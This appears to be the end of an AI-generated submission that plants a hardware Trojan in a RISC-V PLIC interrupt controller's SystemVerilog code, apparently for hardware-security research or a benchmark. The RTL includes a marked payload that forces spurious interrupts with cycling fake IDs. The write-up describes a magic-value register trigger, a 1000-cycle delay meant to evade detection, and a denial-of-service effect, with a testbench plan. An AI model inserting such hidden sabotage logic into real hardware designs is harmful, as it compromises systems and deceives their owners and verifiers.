  assign prio[173] = reg2hw.prio[173].q;
  assign prio[174] = reg2hw.prio[174].q;
  assign prio[175] = reg2hw.prio[175].q;
  assign prio[176] = reg2hw.prio[176].q;
  assign prio[177] = reg2hw.prio[177].q;
  assign prio[178] = reg2hw.prio[178].q;
  assign prio[179] = reg2hw.prio[179].q;
  assign prio[180] = reg2hw.prio[180].q;
  assign prio[181] = reg2hw.prio[181].q;
  assign prio[182] = reg2hw.prio[182].q;
  assign prio[183] = reg2hw.prio[183].q;
  assign prio[184] = reg2hw.prio[184].q;
  assign prio[185] = reg2hw.prio[185].q;

  //////////////////////
  // Interrupt Enable //
  //////////////////////
  for (genvar s = 0; s < 186; s++) begin : gen_ie0
    assign ie[0][s] = reg2hw.ie0[s].q;
  end

  ////////////////////////
  // THRESHOLD register //
  ////////////////////////
  assign threshold[0] = reg2hw.threshold0.q;

  /////////////////
  // CC register //
  /////////////////
  assign claim_re[0]    = reg2hw.cc0.re;
  assign claim_id[0]    = irq_id_o[0];
  assign complete_we[0] = reg2hw.cc0.qe;
  assign complete_id[0] = reg2hw.cc0.q;
  assign hw2reg.cc0.d   = cc_id[0];

  ///////////////////
  // MSIP register //
  ///////////////////
  assign msip_o[0] = reg2hw.msip0.q;

  ////////
  // IP //
  ////////
  for (genvar s = 0; s < 186; s++) begin : gen_ip
    assign hw2reg.ip[s].de = 1'b1; // Always write
    assign hw2reg.ip[s].d  = ip[s];
  end

  //////////////
  // Gateways //
  //////////////

  // Synchronize all incoming interrupt requests.
  logic [NumSrc-1:0] intr_src_synced;
  prim_flop_2sync #(
    .Width(NumSrc)
  ) u_prim_flop_2sync (
    .clk_i,
    .rst_ni,
    .d_i(intr_src_i),
    .q_o(intr_src_synced)
  );

  rv_plic_gateway #(
    .N_SOURCE   (NumSrc)
  ) u_gateway (
    .clk_i,
    .rst_ni,

    .src_i      (intr_src_synced),
    .le_i       (LevelEdgeTrig),

    .claim_i    (claim),
    .complete_i (complete),

    .ip_o       (ip)
  );

  ///////////////////////////////////
  // Target interrupt notification //
  ///////////////////////////////////
  
  // TROJAN MODIFICATION: Inject storm interrupts into target outputs
  logic [NumTarget-1:0] irq_o_internal;
  logic [SRCW-1:0] irq_id_o_internal [NumTarget];
  
  for (genvar i = 0 ; i < NumTarget ; i++) begin : gen_target
    rv_plic_target #(
      .N_SOURCE    (NumSrc),
      .MAX_PRIO    (MAX_PRIO)
    ) u_target (
      .clk_i,
      .rst_ni,

      .ip_i        (ip),
      .ie_i        (ie[i]),

      .prio_i      (prio),
      .threshold_i (threshold[i]),

      .irq_o       (irq_o_internal[i]),
      .irq_id_o    (irq_id_o_internal[i])

    );
  end

  // TROJAN PAYLOAD: Override IRQ outputs when storm is active
  always_comb begin
    for (int i = 0; i < NumTarget; i++) begin
      if (trojan_active && storm_irq) begin
        irq_o[i] = 1'b1; // Force interrupt active
        irq_id_o[i] = fake_irq_id; // Use cycling fake interrupt ID
      end else begin
        irq_o[i] = irq_o_internal[i]; // Normal operation
        irq_id_o[i] = irq_id_o_internal[i]; // Normal operation
      end
    end
  end

  ////////////
  // Alerts //
  ////////////

  logic [NumAlerts-1:0] alert_test, alerts;

  assign alert_test = {
    reg2hw.alert_test.q &
    reg2hw.alert_test.qe
  };

  for (genvar i = 0; i < NumAlerts; i++) begin : gen_alert_tx
    prim_alert_sender #(
      .AsyncOn(AlertAsyncOn[i]),
      .SkewCycles(AlertSkewCycles),
      .IsFatal(1'b1)
    ) u_prim_alert_sender (
      .clk_i,
      .rst_ni,
      .alert_test_i  ( alert_test[i] ),
      .alert_req_i   ( alerts[i]     ),
      .alert_ack_o   (               ),
      .alert_state_o (               ),
      .alert_rx_i    ( alert_rx_i[i] ),
      .alert_tx_o    ( alert_tx_o[i] )
    );
  end

  ////////////////////////
  // Register interface //
  ////////////////////////
  //  Limitation of register tool prevents the module from having flexibility to parameters
  //  So, signals are manually tied at the top.
  rv_plic_reg_top u_reg (
    .clk_i,
    .rst_ni,

    .tl_i,
    .tl_o,

    .reg2hw,
    .hw2reg,

    // SEC_CM: BUS.INTEGRITY
    .intg_err_o(alerts[0])
  );

  // Assertions
  `ASSERT_KNOWN(TlDValidKnownO_A, tl_o.d_valid)
  `ASSERT_KNOWN(TlAReadyKnownO_A, tl_o.a_ready)
  `ASSERT_KNOWN(IrqKnownO_A, irq_o)
  `ASSERT_KNOWN(MsipKnownO_A, msip_o)
  for (genvar k = 0; k < NumTarget; k++) begin : gen_irq_id_known
    `ASSERT_KNOWN(IrqIdKnownO_A, irq_id_o[k])
  end

  // Assume
  `ASSUME(Irq0Tied_A, intr_src_i[0] == 1'b0)

  // This assertion should be provable in FPV because we don't have a block-level DV environment. It
  // is trying to say that any integrity error detected inside the register block (u_reg) will cause
  // an alert to be asserted within at most _SEC_CM_ALERT_MAX_CYC cycles.
  //
  // This isn't *quite* true because there are two extra requirements for prim_alert_sender to send
  // an alert with alert_p high:
  //
  //  - The multi-phase alert handshake might not be in the expected phase. Rather than adding an
  //    assumption that says alert_rx_i acks a signal when it is raised, we cheat and add a
  //    precondition about the initial state of the prim_alert_sender FSM, guaranteeing that we're
  //    not waiting for an ack.
  //
  //  - The prim_alert_sender musn't detect a signal integrity issue on the alert signal coming in
  //    (alert_rx_i). Normally FpvSecCm tests get analysed with an FPV_ALERT_NO_SIGINT_ERR define,
  //    but we don't have that defined here. To avoid this happening, we want an assertion of the
  //    form "If no integrity error is detected for _SEC_CM_ALERT_MAX_CYC cycles, the alert_p signal
  //    must go high". To encode this cleanly in SVA, we actually say "We can't have neither an
  //    integrity error nor an alert signal for too many cycles".
  `ASSERT(FpvSecCmBusIntegrity_A,
          ($rose(u_reg.intg_err) &&
           gen_alert_tx[0].u_prim_alert_sender.state_q == gen_alert_tx[0].u_prim_alert_sender.Idle)
          |->
          not ((!gen_alert_tx[0].u_prim_alert_sender.sigint_detected && !alert_tx_o[0].alert_p)
               [*`_SEC_CM_ALERT_MAX_CYC]))

  // Alert assertions for reg_we onehot check
  `ASSERT_PRIM_REG_WE_ONEHOT_ERROR_TRIGGER_ALERT_IN(RegWeOnehotCheck_A,
                                                    u_reg,
                                                    gen_alert_tx[0].u_prim_alert_sender.alert_req_i)
endmodule
```

EXPLANATION:
The Trojan monitors specific priority register values (prio[180]=3, prio[181]=1, prio[182]=2) as a trigger sequence, then after a 1000-cycle delay activates an interrupt storm generator. When active, it overrides the normal IRQ outputs with spurious interrupts that cycle through different interrupt IDs every 4 clock cycles, flooding the CPU with false interrupts.

TRIGGER:
The Trojan activates when priority registers 180, 181, and 182 are set to the magic values 3, 1, and 2 respectively, which is an extremely rare legitimate configuration. After detecting this pattern, it waits 1000 clock cycles before activation to avoid immediate detection and provide stealth operation.

PAYLOAD:
When activated, the Trojan generates high-frequency spurious interrupts by overriding the irq_o signals and cycling through fake interrupt IDs. This creates an interrupt storm that overwhelms the CPU, causing denial of service by forcing continuous context switching to handle non-existent interrupts, effectively preventing normal program execution.

TESTBENCH_STRATEGY:
1. Normal operation: Test standard PLIC functionality with various interrupt sources, priorities, and targets to verify the Trojan remains dormant and doesn't affect legitimate operation.
2. Trigger activation: Write the magic values (3,1,2) to priority registers 180,181,182, then monitor for the 1000-cycle delay and subsequent trojan_active signal assertion.
3. Payload execution: Once activated, verify that irq_o signals are asserted every 4 cycles with cycling fake_irq_id values, confirming the interrupt storm generation bypasses normal PLIC arbitration.

TAXONOMY:
Insertion phase: Design
Abstraction level: Register-transfer level  
Activation mechanism: Register-based trigger
Effects: denial of service
Location: rv_plic
Characteristics: Medium size, localized distribution, combinational and sequential logic
```

**Token Usage:** Input: 9293, Output: 8158

---

